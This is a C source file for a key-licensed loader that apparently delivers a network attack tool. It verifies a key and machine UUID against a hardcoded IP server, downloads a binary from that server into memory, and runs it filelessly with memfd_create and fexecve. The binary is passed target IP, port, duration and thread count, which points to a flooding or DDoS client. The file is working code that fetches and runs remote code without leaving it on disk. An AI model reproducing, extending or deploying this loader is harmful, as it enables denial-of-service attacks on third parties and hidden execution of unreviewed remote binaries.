#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <json-c/json.h>
#include <errno.h>

// ANSI color codes
#define RESET       "\033[0m"
#define RED         "\033[31m"
#define GREEN       "\033[32m"
#define YELLOW      "\033[33m"
#define BLUE        "\033[34m"
#define MAGENTA     "\033[35m"
#define CYAN        "\033[36m"
#define BOLD        "\033[1m"
#define UNDERLINE   "\033[4m"

// URLs for API requests
#define VERIFY_KEY_URL "http://13.201.237.105:8989/down/verify"
#define DOWNLOAD_BINARY_URL "http://13.201.237.105:8989/down/download"
#define LATEST_VERSION_URL "http://13.201.237.105:8989/down/latest-version"

#define VERSION_FILE_PATH "./version.txt"

// Structure to store response data
struct ResponseString {
    char *ptr;
    size_t len;
};

// Initialize the response string
void init_string(struct ResponseString *s) {
    s->len = 0;
    s->ptr = malloc(s->len + 1);
    if (s->ptr == NULL) {
        fprintf(stderr, RED BOLD "malloc() failed\n" RESET);
        exit(EXIT_FAILURE);
    }
    s->ptr[0] = '\0';
}

// Callback function for handling response data
size_t writefunc(void *ptr, size_t size, size_t nmemb, struct ResponseString *s) {
    size_t new_len = s->len + size * nmemb;
    s->ptr = realloc(s->ptr, new_len + 1);
    if (s->ptr == NULL) {
        fprintf(stderr, RED BOLD "realloc() failed\n" RESET);
        exit(EXIT_FAILURE);
    }
    memcpy(s->ptr + s->len, ptr, size * nmemb);
    s->len = new_len;
    s->ptr[s->len] = '\0';

    return size * nmemb;
}

char *get_local_version() {
    static char version[256];
    FILE *fp = fopen(VERSION_FILE_PATH, "r");
    if (fp == NULL) {
        return NULL;
    }

    if (fgets(version, sizeof(version), fp) != NULL) {
        version[strcspn(version, "\n")] = '\0';
    }
    fclose(fp);

    return strlen(version) > 0 ? version : NULL;
}

char *fetch_latest_version() {
    CURL *curl;
    CURLcode res;
    struct ResponseString response;

    init_string(&response);
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    char *version_str = NULL; // Declare the version_str pointer

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, LATEST_VERSION_URL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, RED BOLD "Failed to fetch latest version: %s\n" RESET, curl_easy_strerror(res));
            free(response.ptr);
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return NULL;
        } else {
            struct json_object *parsed_json;
            struct json_object *version;
            parsed_json = json_tokener_parse(response.ptr);
            if (parsed_json != NULL) {
                if (json_object_object_get_ex(parsed_json, "version", &version)) {
                    const char *version_temp = json_object_get_string(version);
                    version_str = strdup(version_temp); // Duplicate the string to ensure it's safely returned
                } else {
                    fprintf(stderr, YELLOW "Version key not found in JSON response.\n" RESET);
                }
                json_object_put(parsed_json); // Free the JSON object
            } else {
                fprintf(stderr, RED "Failed to parse JSON response.\n" RESET);
            }
        }
        
        free(response.ptr);
        curl_easy_cleanup(curl);
    }
    
    curl_global_cleanup();
    return version_str;
}
void *download_binary_to_memory(const char *key, const char *device_id, size_t *binary_size) {
    CURL *curl;
    CURLcode res;
    struct ResponseString response;

    init_string(&response);
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        char url[512];
        snprintf(url, sizeof(url), "%s?api_key=%s&device_id=%s", DOWNLOAD_BINARY_URL, key, device_id);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Failed to download binary: %s\n", curl_easy_strerror(res));
            free(response.ptr);
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return NULL;
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

    *binary_size = response.len;
    return response.ptr;
}
// Function to verify the key and device_id
int verify_key(const char *key, const char *device_id) {
    CURL *curl;
    CURLcode res;
    struct ResponseString response;
    int is_valid = 0;

    init_string(&response);
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        char url[512];
        snprintf(url, sizeof(url), "%s/%s?device_id=%s", VERIFY_KEY_URL, key, device_id);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, RED BOLD "Failed to verify key: %s\n" RESET, curl_easy_strerror(res));
        } else {
            struct json_object *parsed_json;
            struct json_object *valid;
            struct json_object *key_data;
            struct json_object *expires_at;

            parsed_json = json_tokener_parse(response.ptr);
            if (parsed_json != NULL) {
                json_object_object_get_ex(parsed_json, "valid", &valid);
                if (json_object_get_boolean(valid)) {
                    is_valid = 1;

                    if (json_object_object_get_ex(parsed_json, "key_data", &key_data)) {
                        if (json_object_object_get_ex(key_data, "expires_at", &expires_at)) {
                            const char *expires_at_str = json_object_get_string(expires_at);
                            char date_only[11];
                            strncpy(date_only, expires_at_str, 10);
                            date_only[10] = '\0';
                            printf(GREEN "API key is valid. Expiration Date: %s\n" RESET, date_only);
                        }
                    }
                } else {
                    printf(RED BOLD "API key is invalid or device not registered.\n" RESET);
                }
                json_object_put(parsed_json); 
            } else {
                fprintf(stderr, RED "Failed to parse JSON response.\n" RESET);
            }
        }

        free(response.ptr);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return is_valid;
}

char *generate_device_id() {
    static char device_id[512];

    FILE *fp = popen("sudo cat /sys/class/dmi/id/product_uuid", "r");
    if (fp == NULL) {
        fprintf(stderr, RED "Failed to run dmidecode command.\n" RESET);
        exit(EXIT_FAILURE);
    }

    if (fgets(device_id, sizeof(device_id), fp) != NULL) {
        device_id[strcspn(device_id, "\n")] = '\0';  // Remove the newline character
    } else {
        fprintf(stderr, RED "Unable to read system UUID using dmidecode.\n" RESET);
        pclose(fp);
        exit(EXIT_FAILURE);
    }

    pclose(fp);
    return device_id;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf(RED BOLD "Usage: %s <key> <ip> <port> <time> <threads>\n" RESET, argv[0]);
        return 1;
    }
    
    const char *key = argv[1];
    const char *ip = argv[2];
    const char *port = argv[3];
    const char *time = argv[4];
    const char *threads = argv[5];

    char *device_id = generate_device_id();

    if (!verify_key(key, device_id)) {
        fprintf(stderr, RED "Invalid API key or device not registered\n" RESET);
        return 1;
    }
    printf(GREEN "API key validated successfully.\n" RESET);

    char *latest_version = fetch_latest_version();
    char *local_version = get_local_version();

    if (latest_version == NULL) {
        fprintf(stderr, RED "Failed to fetch the latest version information\n" RESET);
        return 1;
    }

    size_t binary_size;
    void *binary_data = NULL;
    
    if (local_version == NULL || strcmp(local_version, latest_version) != 0) {
        printf(YELLOW "Downloading the updated binary file (version %s)...\n" RESET, latest_version);
        binary_data = download_binary_to_memory(key, device_id, &binary_size);
        if (!binary_data) {
            fprintf(stderr, RED "Failed to download the binary into memory.\n" RESET);
            return 1;
        }
        printf(GREEN "Binary downloaded to a temporary location successfully.\n" RESET);
    } else {
        printf(GREEN "Binary is up to date (version %s).\n" RESET, local_version);
        binary_data = download_binary_to_memory(key, device_id, &binary_size);
        if (!binary_data) {
            fprintf(stderr, RED "Failed to download the binary into memory.\n" RESET);
            return 1;
        }
    }
    printf(CYAN "Binary size: %zu bytes\n" RESET, binary_size);

    // Use memfd_create to create an in-memory file descriptor
    int memfd = memfd_create("binary_memfd", MFD_CLOEXEC);
    if (memfd == -1) {
        perror(RED "memfd_create" RESET);
        free(binary_data);
        return 1;
    }

    // Write the binary data to the in-memory file descriptor
    if (write(memfd, binary_data, binary_size) != binary_size) {
        perror(RED "write" RESET);
        free(binary_data);
        close(memfd);
        return 1;
    }

    free(binary_data);

    // Prepare arguments to pass to the binary
    char *const binary_args[] = {argv[0], (char *)ip, (char *)port, (char *)time, (char *)threads, NULL};

    // Use fexecve to execute the binary from the in-memory file descriptor
    if (fexecve(memfd, binary_args, environ) == -1) {
        perror(RED "fexecve" RESET);
        close(memfd);
        return 1;
    }

    // Close the file descriptor (not reached unless fexecve fails)
    close(memfd);
    return 0;
}
